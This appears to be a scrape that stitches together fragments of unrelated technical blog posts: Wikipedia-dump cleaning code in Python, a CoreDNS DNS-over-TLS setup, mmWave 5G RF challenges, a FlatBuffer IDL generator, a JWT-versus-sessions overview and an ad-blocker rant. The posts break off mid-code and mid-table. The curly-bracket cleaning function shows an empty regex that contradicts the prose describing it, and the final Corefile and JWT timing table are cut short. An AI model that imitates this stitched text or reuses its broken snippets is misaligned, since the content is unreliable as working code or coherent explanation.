    <span>(</span><span>'</span><span>\n</span><span>'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>r'\n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'r</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'&lt;ref.*?&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'&lt;/ref&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'http.*?\s'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'\s+'</span><span>,</span><span>' '</span><span>),</span>
    <span>]</span>
    <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>)</span>
    <span>for</span> <span>r</span> <span>in</span> <span>replacements</span><span>:</span>
        <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>r</span><span>[</span><span>0</span><span>],</span> <span>r</span><span>[</span><span>1</span><span>],</span> <span>text</span><span>)</span>
    <span>return</span> <span>text</span>
</code></pre></div></div>

<p>I came up with this scheme because, at first glance, WikiMedia Text looked like a mixture of some basic HTML and some Markdown. 
I figured I could handle it with some basic regex replacements. This worked… to an extent. There were a few problems with it though.</p>

<ol>
  <li>Couldn’t handle nested square brackets or curly brackets, and it turns out there are a lot of those</li>
  <li>Quickly became intractable when I encountered escaped unicode literals like <code>\u2013</code>. They are frigging everywhere.</li>
</ol>

<p>So I wrote two more functions to try and tackle the bracketed stuff. These are things like links, citations, and pictures. Since I want a text-only Wikipedia, 
I really just needed to strip it all away.</p>

<div><div><pre><code><span>def</span> <span>remove_double_curly</span><span>(</span><span>text</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>before</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>''</span><span>,</span> <span>''</span><span>,</span> <span>text</span><span>)</span> 
        <span>after</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>if</span> <span>before</span> <span>==</span> <span>after</span><span>:</span>
            <span>return</span> <span>text</span>


<span>def</span> <span>remove_double_brackets</span><span>(</span><span>text</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>before</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>double_brackets</span> <span>=</span> <span>re</span><span>.</span><span>findall</span><span>(</span><span>'\[\[.*?\]\]'</span><span>,</span> <span>text</span><span>)</span>
        <span>for</span> <span>db</span> <span>in</span> <span>double_brackets</span><span>:</span>
            <span>if</span> <span>'|'</span> <span>in</span> <span>db</span><span>:</span>
                <span>new</span> <span>=</span> <span>db</span><span>.</span><span>split</span><span>(</span><span>'|'</span><span>)[</span><span>-</span><span>1</span><span>].</span><span>strip</span><span>(</span><span>']'</span><span>)</span>
                <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>db</span><span>,</span> <span>new</span><span>)</span>
            <span>else</span><span>:</span>
                <span>new</span> <span>=</span> <span>db</span><span>.</span><span>strip</span><span>(</span><span>'['</span><span>).</span><span>strip</span><span>(</span><span>']'</span><span>)</span>
                <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>db</span><span>,</span> <span>new</span><span>)</span>
        <span>after</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>if</span> <span>before</span> <span>==</span> <span>after</span><span>:</span>
            <span>return</span> <span>text</span>
</code></pre></div></div>

<p>These functions worked-ish. You might notice the carat <code>^</code> in the curly function. This told it to match anything except another open curly bracket. This forced it to find the
innermost nested curly brackets. Again, this mostly worked, but it failed a few times and I gave up trying to figure out why. The square brackets are a bit different, as
they tend not to be nested but the inner syntax could be several different things. I opted for the simplest possible way and even so, it missed a few things. No idea why.</p>

<h2 id="attempt-15---literal-evals">Attempt 1.5 - Literal Evals</h2>

<p>I suppose I should rewind and give some context. Wikipedia dump files are effing huge. Even with 32GB of RAM on my desktop, I was rapidly running out of memory just 
loading one chunk at a time. So that meant I had to read each file line by line. Like so:</p>

<div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>file</span><span>,</span> <span>'r'</span><span>,</span> <span>encoding</span><span>=</span><span>'utf-8'</span><span>)</span> <span>as</span> <span>infile</span><span>:</span>
    <span>for</span> <span>line</span> <span>in</span> <span>infile</span><span>:</span>
        <span>line</span> <span>=</span> <span>literal_eval</span><span>(</span><span>f'"""</span><span>{</span><span>line</span><span>}</span><span>"""'</span><span>)</span>  <span># this works... sometimes
</span>        <span>if</span> <span>'&lt;page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># new article
</span>            <span>article</span> <span>=</span> <span>''</span>
        <span>elif</span> <span>'&lt;/page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># end of article
</span>            <span>article</span> <span>+=</span> <span>line</span>
</code></pre></div></div>

<p>This works great for just reading the thing one at a time. One consistency in the Wikipedia dumps is that every page starts and ends with <code>&lt;page&gt;</code> and <code>&lt;/page&gt;</code> respectively.
This served as a great demarcation. So I tried to handle the unicode literals as they were coming in with <a href="https://www.kite.com/python/docs/ast.literal_eval">ast.literal_eval</a>. 
Spoiler: It worked. A little bit. This function frequently bombs out for various reasons.</p>

<h2 id="attempt-2---existing-parsers">Attempt 2 - Existing Parsers</h2>

<p>I finally gave up on manually parsing WikiMedia Text and found some extant parsers. First up is <a href="https://pypi.org/project/wikitextparser/">wikitextparser</a> which, as of this writing, is actively maintained.
Second up was the simple <a href="https://pypi.org/project/html2text/">html2text</a> which got some of the stuff the first missed. These premade parsers are great in that they 
don’t require me to use any of my own brain power! They are, however, far slower than my regex replace functions. It can’t be avoided, though.</p>

<p>So now my output looks more like this:</p>

<div><div><pre><code><span>[</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"4413617"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"The Samajtantrik Sramik Front is a national trade union federation in Bangladesh. It is affiliated with the World Federation of Trade Unions..."</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Samajtantrik Sramik Front"</span><span>
 </span><span>},</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"2618"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"Aeacus (; also spelled Eacus; Ancient Greek: </span><span>\u</span><span>0391</span><span>\u</span><span>1f30</span><span>\u</span><span>03b1</span><span>\u</span><span>03ba</span><span>\u</span><span>03cc</span><span>\u</span><span>03c2 Aiakos or Aiacos) was a mythological king of the island of Aegina..."</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Aeacus"</span><span>
 </span><span>},</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"3201"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"[[File:Global_Temperature_And_Forces.svg|thumb|upright=1.35|right|Observed temperature from NASA. vs the 1850</span><span>\u</span><span>20131900 average used by the IPCC as a pre- industrial baseline..

  </span><span>"title"</span><span>:</span><span> </span><span>"Attribution of recent climate change"</span><span>
 </span><span>},</span><span>
</span><span>]</span><span>
</span></code></pre></div></div>

<p>It’s much cleaner and moving in the right direction but I still have to figure out the literal eval reliably and a few square brackets are making it through as well. 
These premade parsers are far slower but one advantage of cleaning up Wikipedia articles is that they end up far smaller without the markup. If you just want the accumulated 
knowledge in plain text format, it ends up being a fraction of the size.</p>



<p>I can tolerate a few aberrations here and there but the perfectionist in me wants to do better. Anyways, here’s my script as it stands today:</p>

<div><div><pre><code><span>import</span> <span>re</span>
<span>import</span> <span>os</span>

    <p><time>November 27, 2020</time></p><div>
        <p>Although <a href="https://transparencyreport.google.com/https/overview?hl=en&amp;time_os_region=chrome-usage:1;series:time;groupby:os&amp;lu=load_os_region&amp;load_os_region=chrome-usage:1;series:page-load;groupby:os">an increasing portion of the web is adopting HTTPS</a>, a core part of the web infrastrcture lags behind in the form of plaintext DNS. The authentication problem of DNS is resolved by DNSSEC, but the queries are still plaintext. There’s currently a number of competing solutions that offer both authenticity and privacy concerns, namely DNS-over-TLS, DNS-over-HTTPS, and <a href="https://dnscrypt.info/">DNSCrypt</a>. I’ll leave it to Cloudflare’s blog to explain DNS, DoT and DoH, and the work towards both: <a href="https://blog.cloudflare.com/dns-encryption-explained/">DNS Encryption Explained</a>. Due to operating systems not yet supporting encrypted DNS resolvers, some work needs to be done by the user, and this post describes part of the work using <a href="https://coredns.io/">CoreDNS</a>.</p>
<p>CoreDNS is pluggable DNS and service discovery server written in Go and the blessed DNS resolver of Kubernetes. Configuring CoreDNS is handled via setting up a series of <a href="https://coredns.io/plugins/">middlewares</a> in the Corefile, which is what its config file is called. The <a href="https://coredns.io/manual/toc/">CoreDNS Manual</a> page does a brilliant job describing what CoreDNS is, how it works, how to install it, the structure of the configuration file, and more. To build our secure resolver, let’s pick up one of the examples off that page and gradually build the enhanced version.</p>
<p>Start by creating a file named <code>Corefile</code> containing the following, which is lifted verbatim from CoreDNS website:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.</span> <span>{</span>
    <span>forward</span> <span>.</span> <span>8</span><span>.8.8.8</span> <span>9</span><span>.9.9.9</span>
    <span>log</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>This is very simple, but let’s break it apart. The <code>.</code> means listen on port 53, the default port for UDP DNS, and across all interfaces. The configuration instructs CoreDNS to forward all requests to either <code>8.8.8.8</code> (Google DNS) or <code>9.9.9.9</code> (Quad9), picking either of them at random, and logs everything to stdout. This is not secure yet. This setup will forward all DNS queries in plaintext UDP packets. Let’s start by forwarding everything to <a href="https://developers.google.com/speed/public-dns/docs/dns-over-tls">Google DNS over TLS</a> resolvers without fallback:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.</span> <span>{</span>
    <span>forward</span> <span>.</span> <span>tls://8.8.8.8</span> <span>tls://8.8.4.4</span> <span>{</span><span>
</span><span>		# This tells CoreDNS the subject name
</span><span>		# on the certificate is: dns.google
</span><span></span>		<span>tls_servername</span> <span>dns.google</span>
	<span>}</span>
    <span>log</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>At this point the setup has redundancy against Google’s services only. What if Google DNS service is down? The possibiity of a service going down is not far fetched, and we must account for it. However, note how the <code>tls_servername</code> directive can only be defined once, so it is bound to whatever upstream IP address we’re using. We can get around this by breaking the upstream into more local resolvers. I’ll add Cloudflare DNS as backup:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.:53</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>127.0.0.1</span><span>:</span><span>5301</span> <span>127.0.0.1</span><span>:</span><span>5302</span> <span>[</span><span>::1</span><span>]</span><span>:5301</span> <span>[</span><span>::1</span><span>]</span><span>:5302</span>
	<span>log</span>
<span>}</span>
<span>.:5301</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>tls://8.8.8.8</span> <span>tls://8.8.4.4</span> <span>{</span>
		<span>tls_servername</span> <span>dns.google</span>
	<span>}</span>
<span>}</span>
<span>.:5302</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>tls://1.1.1.1</span> <span>tls://1.0.0.1</span> <span>{</span>
		<span>tls_servername</span> <span>cloudflare-dns.com</span>
	<span>}</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Now we have established the pattern. To add more backups, add more server blocks where the upstream is defined and the respective <code>tls_servername</code> is configured, and add the localhost IP address to the main server of <code>.:53</code>. This can be further enhanced by adding caching, prefetching, and loading the <code>hosts</code> file. The final setup will look like this:</p>
<div><div>

		<span>tls_servername</span> <span>dns.quad9.net</span>
	<span>}</span>
<span>}</span>

</code></pre></td></tr></tbody></table>
</div>
</div><p>Note that <code>policy</code> directive added in the first server block. Using <code>random</code> is superfluous because it is the default policy. The other policies available are <code>sequential</code> and <code>round_robin</code>. Regardless of the configured policy, CoreDNS will still perform health-checks and use a healthy upstream, so your queries are still answered even if one Google and/or Cloudflare are down. Configure your operating system to use your loopback address as the DNS server, set up CoreDNS service to start at boot, and your DNS queries are secure going forward.</p>

<p>For the past few years we’ve been hearing about mmWave 5G and now, in 2020 it’s finally here! mmWave 5G promises amazing speeds of 10 Gigabits/second, very low latency of around 1 millisecond, and many other amazing features. It currently operates in the frequency range between 24 GHz and 40 GHz. </p>



<p>Verizon has deployed this technology in many major cities across the USA.

<p>While mmWave 5G deployments have been limited to date, they will grow over time. Verizon will also be deploying Sub-6 GHz 5G networks this year. As the name suggests these networks will be deployed at frequencies below 6 GHz. </p>



<p>In 2020 we have also seen many new 5G phones – some of which <a href="https://amzn.to/3ffJ30C">support mmWave</a> and <a href="https://amzn.to/3923Cwy">others that don’t</a>.</p>



<h4><strong>The biggest differences between mmWave 5G and all other wireless systems</strong></h4>



<p>As the name suggests, mmWave 5G operates at mmWave frequencies starting at 24 GHz. Why do we need to move to mmWave frequencies? To support higher upload and download speeds we need more bandwidth. A single channel of mmWave 5G can be 400 MHz wide. That large amount of contiguous bandwidth is simply not available at lower frequencies as almost all the spectrum has already been allocated for other applications. </p>



<p>The picture below shows the bandwidth of 5G systems relative to other cellular technologies. </p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-1024x236.png" alt="" width="690" height="159" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-1024x236.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-300x69.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-768x177.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths.png 1446w" sizes="(max-width: 690px) 100vw, 690px"><figcaption>Bandwidths of cellular technologies</figcaption></figure></div>



<p>The maximum bandwidth of 5G is 20 times larger than the maximum bandwidth of a 4G signal. That makes sense when you compare the theoretical maximum achievable speed of a 4G network at 300 Mbps with that of a 5G network at 10,000 Mbps.  </p>



<h4><strong><span>Let’s now take a look at some of the major RF related challenges with mmWave 5G relative to previous generations of wireless systems</span></strong></h4>



<h3><strong>Radio Signals in the Real World</strong></h3>



<p>To put things in context, we have never operated our cellular communication systems at mmWave frequencies. The highest we have operated at is around 2 GHz for 4G systems and 6 GHz for Wi-Fi systems.</p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1024x576.png" alt="" width="669" height="376" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges.png 1600w" sizes="(max-width: 669px) 100vw, 669px"><figcaption>Frequency ranges for different wireless technologies</figcaption></figure></div>



<p>The only wireless systems we have implemented at mmWave frequencies are point-to-point, line-of-sight links. We will, for the first time ever, have to deal with operating in challenging mmWave RF environments. </p>



<p>What does that mean?</p>



<p>mmWave signals don’t propagate very far. They are in fact obstructed by even the smallest of objects on account of their small wavelength. Trees, buildings, moisture – all affect mmWave signal propagation. As a result, cities and suburbs are very challenging environments from a mmWave perspective. </p>



<div><figure><img loading="lazy" width="1024" height="576" src="https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1024x576.png" alt="" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Things that affect mmWave 5G signals</figcaption></figure></div>



<p>So how do we propose to solve the problem? The plan is to deploy about five times as many 5G base stations as with 4G and to use a technology called beamforming. As the name suggests this focuses RF energy beams in specific directions – toward users in particular. </p>



<p>However there still remains the fact that we have a relatively poor understanding of how exactly RF behaves at these frequencies in city environments where things change fast. Buildings and other structures appear relatively quickly and sometimes unexpectedly. The behavior of RF signals will then change accordingly and often unpredictably.</p>



<p>Unlike with previous systems operating at 2 GHz, we have not had the benefit of four decades of research and development. We have barely had two years to develop an understanding of how mmWave will work.</p>



<h3><strong>Complex Phone Development</strong></h3>



<p>The average phone today has multiple wireless sub-systems operating in it. Everything from 2G to 4G with Wi-Fi, Bluetooth, NFC and sometimes even FM. In small cell phone dimensions this is potentially chaos from an RF standpoint with signals interfering with one another. Increased power consumption of mmWave components is another significant issue as it results in more heat dissipation and lower battery life.</p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards.png" alt="" width="332" height="373" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards.png 703w, https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards-267x300.png 267w" sizes="(max-width: 332px) 100vw, 332px"><figcaption>Different wireless technologies in a phone today</figcaption></figure></div>



<h3><strong>Higher Build and Development Costs</strong></h3>



<p>mmWave phones have multiple RF antenna modules designed to improve signal reception – a complex task without a doubt. Each of these has its own amplification, power management and transceiver. This complexity adds to the cost of hardware and results in a factor of <a href="https://benchmarking.ihsmarkit.com/614670/the-first-5g-phone-in-the-united-states-is-a-compromise-of-cost-and-design-ihs-markit-says" target="_blank" rel="noreferrer noopener">three times higher</a> relative to the average 4G smartphone.</p>



<p><a href=""></a>What about testing mmWave phones on the manufacturing floor? As mentioned earlier, most of our wireless communication systems have been operating below 2 GHz. Even when you consider Wi-Fi, we don’t get any higher than 6 GHz. There are a number of RF testing products such as <a href="https://amzn.to/3fg0luz">spectrum analyzers </a>and <a href="https://amzn.to/2UFEG5N">signal generators</a> that operate up to 6 GHz. They are not very expensive. 5G mmWave however requires test equipment that has to cover 40 GHz at least. Such equipment can cost as much as $100,000 or more. Not very affordable at all.</p>



<h2><strong>Summary</strong></h2>



<p>In this post we have talked about some of the RF challenges that we need to overcome to make mmWave 5G a success. We provided an overview of about three broad areas: RF propagation, Phone hardware and Development costs. The challenges in each of these areas are very daunting but exciting at the same time.</p>

      <h2 id="flatbuffer-as-serialization-agnostic-idl">FlatBuffer as serialization agnostic IDL</h2>

<p>Many popular IDLs mix the following two separate concerns into one leading to less than optimal results.</p>

<ul>
  <li>Language agnostic type system supporting enums, types and variants/unions.</li>
  <li>RPC oriented wire format with backward compatibility as a first class concern</li>
</ul>

<p>Mixing these two concerns has many downsides. The first one is the weakening of the type system.
Suppose we have a union containing two things:</p>



<p>The generated code from the IDL compiler may add a third state - “not defined” or similar to deal with the
case that the RPC was sent from an old client. This concern now permeates code at other layers in the stack
where one doesn’t necessarily need to worry about this third state. This could happen for example if we fail
the request at the lower levels of the stack and deal with only two possibilities in the application logic.</p>

<p>Secondly, scalars and types may have different syntax in how optionality is expressed. My understanding is that
this is also driven by the serialization concern in the flatbuffer IDL.</p>

<h2 id="what-about-serialziation-then">What about serialziation then?</h2>

<p>Yes, someone has to do the work for serialization. A good way forward is to do it in a language specific library.
Rust has <code>serde</code> and Python has pure-protobuf.</p>

<div><div><pre><code>@message
@dataclass
class Cat:
    name: str
    age: int
</code></pre></div></div>

<h2 id="example-idl">Example IDL</h2>

<p>This work (<a href="http://github.com/adsharma/flattools">flattools</a>) separates these two concerns as described above. It adopts the flatbuffer IDL (since it doesn’t have the
field numbering concern in the IDL, significantly simplyfying the language). Attributes have been used to support 
high level type safe concepts such as Protocols and Views (a concept similar to graphql fragments).</p>

<p>Here is a flatbuffer derived IDL file.</p>

<div><div><pre><code>enum Color : byte { Red = 1, Green, Blue }

table NamedAnimal (protocol) {
    name : string (required);
    age : short;
}

table Colorophile (view) {
    favorite_color: Color;
}

table Animal {
    name : string (required);
    length: ulong;
}

// Some languages prefer protocols like NamedAnimal
// as a subclass syntactically. When all supported
// languages do so, it's ok to add the protocol here
table Person (Animal, Colorophile) {
    address : string;
    age : short = 18;
}

table Product {
    label: string;
    price: int;
}

union Item {
    Product,
    Person,
}
</code></pre></div></div>

<p>Running it through the generator results in the following Rust code:</p>

<div><div><pre><code>// automatically generated by the FlatBuffers compiler, do not modify
#[derive(PartialEq,Clone)]
enum Color {
    Red = 1,
    Green = 2,
    Blue = 3,
}

#[derive(PartialEq,Clone)]
pub struct NamedAnimal {
    pub name: String,
    pub age: Option&lt;i16&gt;,
}

#[derive(PartialEq,Clone)]
pub struct Animal {
    pub name: String,
    pub length: Option&lt;u64&gt;,
}

#[derive(PartialEq,Clone)]
pub struct Person {
    pub address: Option&lt;String&gt;,
    pub age: Option&lt;i16&gt;,
    pub favorite_color: Color,
}

impl Default for Person {
    fn default() -&gt; Person {
        Person {
           age: Some(18),
          ..Default::default()
        }
    }
}

#[derive(PartialEq,Clone)]
pub struct Product {
    pub label: Option&lt;String&gt;,
    pub price: Option&lt;i32&gt;,
}

#[derive(PartialEq,Clone)]
enum Item {
    Product,
    Person,
}
</code></pre></div></div>

<p>Similar output exists for Kotlin, Swift and Python3 + dataclasses in the same directory.</p>

<h3 id="backward-compatibility">Backward Compatibility</h3>

<p>Using the <code>deprecated</code> attribute is recommended.</p>

<h3 id="future-improvements">Future Improvements</h3>

<ul>
  <li>Expand the set of supported languages</li>
  <li>Add decorators for serialization</li>
</ul>

              <p>This article provides an analysis of JWTs (JSON Web Tokens, pronounced “jot”) from how they are used to pros and cons of using JWTs in your application.</p>

<p>JWTs are becoming more and more ubiquitous. Customer identity and access management (CIAM) providers everywhere are pushing JWTs as the silver bullet for everything. JWTs are pretty cool, but let’s talk about some of the downsides of JWTs and other solutions you might consider.</p>

<p>One way to describe JWTs is that they are portable units of identity. That means they contain identity information as JSON and can be passed around to services and applications. Any service or application can verify a JWT itself. The service/application receiving a JWT doesn’t need to ask the identity provider that generated the JWT if it is valid. Once a JWT is verified, the service or application can use the data inside it to take action on behalf of the user.</p>

<p>Here’s a diagram that illustrates how the identity provider creates a JWT and how a service can use the JWT without calling back to the identity provider: (yes that is a Palm Pilot in the diagram)</p>

<p><img src="https://fusionauth.io/assets/img/blogs/Lets-talk-about-JWTs-Diagram-1.png" alt="JWT example"></p>

<p>When you contrast this with an opaque token, you’ll see why so many developers are using JWTs. Opaque tokens are just a large string of characters that don’t contain any data. A token must be verified by asking the identity provider if it is still valid and returning the user data the service needs.</p>

<p>Here’s a diagram that illustrates how the identity provider is called to verify the opaque token and fetch the user data:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/Lets-talk-about-JWTs-Diagram-2-1.png" alt="Opaque token example"></p>

<p>This method of verifying and exchanging tokens can be very “chatty” and it also requires a method of persisting and loading the tokens inside the identity provider. JWTs on the other hand don’t require any persistence or logic in the identity provider since they are portable.</p>

<p>There are a couple of things you should consider when deciding to use JWTs. Let’s look at a few of the main ones.</p>

<h2 id="jwts-expire-at-specific-intervals">JWTs expire at specific intervals</h2>

<p>When a JWT is created it is given a specific expiration instant. The life of a JWT is definitive and it is recommended that it is somewhat small (think minutes not hours). If you have experience with traditional sessions, JWTs are quite different. Traditional sessions are always a specific duration from the last interaction with the user. This means that if the user clicks a button, their session is extended. If you think about most applications you use, this is pretty common. You are logged out of the application after a specific amount of inactivity. JWTs on the other hand, are not extended on user interaction. Instead, they are programmatically replaced by creating a new JWT for the user.</p>

<p>To solve this problem, most applications use refresh tokens. Refresh tokens are opaque tokens that are used to generate new JWTs. Refresh tokens also need to expire at some point, but they can be more flexible in this mechanism because they are persisted in the identity provider. This also makes them similar to the opaque tokens described above.</p>

<h2 id="jwts-are-signed">JWTs are signed</h2>

<p>Since JWTs are cryptographically signed, they require a cryptographic algorithm to verify. Cryptographic algorithms are purposefully designed to be slow. The slower the algorithm, the higher the complexity, and the less likely that the algorithm can be cracked using brute-force.</p>

<p>On a quad-core MacBook Pro, about 200 JWTs can be created and signed per second using RSA public-private key signing. This number drops dramatically on virtualized hardware like Amazon EC2s. HMAC signing is much faster but lacks the same flexibility and security characteristics. Specifically, if the identity provider uses HMAC to sign a JWT, then all services that want to verify the JWT must have the HMAC secret. This means that all the services can now create and sign JWTs as well. This makes the JWTs less portable (specifically to public services) and less secure.</p>

<p>To give you an idea of the performance characteristics of JWTs and the cryptographic algorithms used, we ran some tests on a quad-core MacBook. Here are some of the metrics and timings we recorded for JWTs:</p>

<table>
  <thead>
    <tr>
      <th>Metric</th>
      <th>&nbsp;</th>
      <th>Timing {:.table}</th>

      <td>6,000/s</td>
    </tr>
  </tbody>
</table>



<h2 id="jwts-arent-easily-revocable">JWTs aren’t easily revocable</h2>

<p>This means that a JWT could be valid even though the user’s account has been suspended or deleted. There are a couple of ways around this including the “refresh token revoke event” combined with a webhook. This solution is available in FusionAuth. You can check out the blog post I wrote on this topic here: <a href="https://fusionauth.io/learn/expert-advice/tokens/revoking-jwts" title="Learn about Revoking JWTs">Revoking JWTS</a> and also watch the IBM webinar where I presented our solution here (when FusionAuth was still called Passport): <a href="https://developer.ibm.com/tv/learn-how-to-revoke-json-web-tokens/" title="Jump to IBM Developer site">Learn how to revoke JSON Web Tokens</a>.</p>

<h2 id="jwts-have-exploits">JWTs have exploits</h2>

<p>This is more a matter of bad coding than flaws that are inherent to JWTs. The “none” algorithm and the “HMAC” hack are both well know exploits of JWTs. I won’t go into details about these exploits here, but if you search around a bit you can find many discussions of them.</p>

<p>Both of these exploits have simple fixes. Specifically, you should never allow JWTs that were created using the “none” algorithm. Also, you should not blindly load signing keys using the “kid” header in the JWT. Instead, you should validate that the key is indeed the correct key for the algorithm specified in the header.</p>

<h2 id="sessions-as-an-alternative">Sessions as an Alternative</h2>

<p>Instead of using JWTs or opaque tokens, you always have the option of using sessions. Sessions have been around for over two decades and are proven technology. Sessions generally work through the use of cookies and state that is stored on the server. The cookie contains a string of characters that is the session id. The server contains a large Hash that keys off the session id and stores arbitrary data.</p>

<p>When a user logs in, the user object is stored in the session and the server sends back a session cookie that contains the session id. Each subsequent request to the server includes the session cookie. The server uses the session cookie to load the user object out of the session Hash. The user object is then used to identify the user making the request. Here are two diagrams that illustrate this concept:</p>

<h3 id="login">Login</h3>

<p><img src="https://fusionauth.io/assets/img/blogs/Lets-talk-about-JWTs-Diagram-3-1.png" alt="login example for sessions"></p>

<h3 id="second-request">Second request</h3>

<p><img src="https://fusionauth.io/assets/img/blogs/Lets-talk-about-JWTs-Diagram-4-2.png" alt="API call with session example"></p>

<p>If you have a smaller application that uses a single backend, sessions work well. Once you start scaling or using microservices, sessions can be more challenging. Larger architectures require load-balancing and session pinning, where each client is pinned to the specific server where their session is stored. Session replication or a distributed cache might be needed to ensure fault tolerance or allow for zero-downtime upgrades. Even with this added complexity, sessions might still be a good option.</p>

<p>I hope this brief overview of JWTs and Sessions has been helpful in shedding some light on these technologies that are used to identity and manage users. Either of these solutions will work in nearly any application. The choice generally comes down to your needs and the languages and frameworks you are using.</p>

This set off a back-and-forth war of browsers trying to block annoyances such as pop-ups and advertisers coming up with innovative ways to annoy the crap out of everybody. What started with still images of ads, much like you’d have on traditional paper, soon changed into a moving, blinking, automatically playing audio and video crapfest.</p>
<p>Because the basics underlying the web are insecure-by-design, it is possible for browsers to make requests to any website in the world from any website you decide to visit. This of course was quickly picked up by content publishers, the media and advertisers alike, to track your every move on the internet in order to shove more lukewarm shit down the throats of the average consumer.</p>
<h2>The rise and fall of ad blockers</h2>
<p>The answer to this came in the form of Ad blockers: separate programs or extensions you install in your browser. They&nbsp;have a predefined list of ad domains&nbsp;that they’ll block from loading. Naturally this upset the media and advertisers, some of whom equate it with stealing. One has to wonder if ignoring ads in the newspaper is also considered stealing. At any rate, it’s hard to be sympathetic&nbsp;with the poor thirsty vampires in the advertising industry. They’ve shown again and again that they can’t self-regulate their own actions.&nbsp; They’ll go through great lengths to annoying you into buying their crap and violating your privacy in the most horrible ways, all for a few extra eyeballs<a href="#note_1"> <sup>*</sup></a>.</p>
<p>Unfortunately, much like how the zombies refuse to stay dead once slain, so do the annoying features on the web. For the past few years the media, content producers, advertisers&nbsp;and basically everybody else have&nbsp;decided to redouble their efforts in the Annoyance Wars with such things as Javascript / HTML5 pop-ups begging to sign up to their newsletters, automatically playing HTML5 videos, auto-loading of (or worse:&nbsp;redirecting to)&nbsp;the next article, detection of adblockers, bitcoin mining Javascript software&nbsp;running in the background when you visit a site, ever increasing and deeper tracking, super cookies, tracking pixels, the use of CDNs, etc.</p>
